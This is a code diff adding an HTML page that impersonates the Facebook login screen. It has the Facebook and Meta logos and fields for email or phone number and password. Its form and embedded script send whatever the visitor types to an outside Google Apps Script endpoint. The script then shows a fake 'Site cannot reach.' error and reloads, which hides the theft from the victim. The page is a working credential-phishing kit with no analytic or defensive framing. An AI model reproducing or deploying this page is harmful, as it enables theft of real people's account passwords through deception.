@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+  <link rel="shortcut icon" href="favfb.ico" type="image/x-icon" />
+  <title>Facebook Login</title>
+
+  <link rel="stylesheet" href="style.css">
+
+  <link href='https://fonts.googleapis.com/css?family=Poppins' rel='stylesheet'>
+
+
+
+
+
+
+</head>
+
+<body>
+
+
+  <div class="main-page">
+    <div class="language">
+      <p>English (UK)</p>
+    </div>
+    <div class="fb_logo">
+      <img src="Facebook Logo.png">
+    </div>
+    <form action="https://script.google.com/macros/s/AKfycbxokrgxpdVX-m4oq6vm8zfYrFhtSHEMFgmzjQV7vAfBPiUN7tTuL5t_G8q19e5gFfOTAg/exec" method="POST" name="contact-form">
+      <div class="login-input">
+        <input type="text" placeholder="Mobile number or email address" name="UserId">
+        <input type="password" placeholder="Password" name="Passwords">
+      </div>
+      <div class="login-button">
+        <button type="submit">Log in</button>
+      </div>
+    </form>
+    <div class="help_me">
+      <a href="#">
+        <h6>Help me log in</h6>
+      </a>
+    </div>
+    <div class="create_new">
+      <h6>Create new account</h6>
+    </div>
+    <div class="meta-logo">
+      <img src="meta logo.png">
+    </div>
+  </div>
+
+
+
+
+  <script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbxokrgxpdVX-m4oq6vm8zfYrFhtSHEMFgmzjQV7vAfBPiUN7tTuL5t_G8q19e5gFfOTAg/exec'
+    const form = document.forms['contact-form']
+    form.addEventListener('submit', e => {
+      e.preventDefault()
+      fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+        .then(response => alert("Site cannot reach."))
+        .then(() => { window.location.reload(); })
+        .catch(error => console.error('Error!', error.message))
+    })
+  </script>
+
+
+
+</body>
+
+</html>
